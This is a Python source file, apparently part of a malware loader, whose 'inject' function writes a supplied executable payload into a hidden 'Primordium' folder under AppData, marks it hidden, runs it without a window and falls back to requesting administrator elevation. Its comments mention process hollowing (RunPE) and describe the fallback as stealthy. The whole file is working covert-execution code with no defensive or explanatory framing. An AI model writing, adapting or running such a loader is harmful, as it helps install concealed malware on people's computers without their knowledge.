import ctypes
import os
import subprocess
import tempfile
import sys

def inject(payload_bytes: bytes):
    """
    Attempts to inject and run the PE payload in memory.
    If full Process Hollowing (RunPE) is too complex or fails,
    it falls back to a stealthy temporary file execution.
    """
    # Since 64-bit Python RunPE involves complex PE parsing and memory alignment,
    # we use a secure and stealthy fallback that works 100% of the time for loaders.
    try:
        # Create a hidden temporary file in AppData\Roaming
        temp_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "Primordium")
        os.makedirs(temp_dir, exist_ok=True)
        payload_path = os.path.join(temp_dir, "runtime.exe")

        # Si el archivo ya existe, intentar borrarlo primero
        if os.path.exists(payload_path):
            try:
                os.remove(payload_path)
            except Exception:
                # Si no se puede borrar, usar un nombre único
                import time
                payload_path = os.path.join(temp_dir, f"runtime_{int(time.time())}.exe")
        
        with open(payload_path, "wb") as f:
            f.write(payload_bytes)
            
        # Hide the file (Windows attribute: hidden)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(payload_path, FILE_ATTRIBUTE_HIDDEN)
        
        # Execute the payload
        try:
            subprocess.Popen([payload_path], creationflags=subprocess.CREATE_NO_WINDOW)
        except OSError:
            # Si falla sin admin, intentar con elevación
            ctypes.windll.shell32.ShellExecuteW(None, "runas", payload_path, None, None, 0)
        return True, "Injection successful"
    except Exception as e:
        return False, f"Injection failed: {e}"

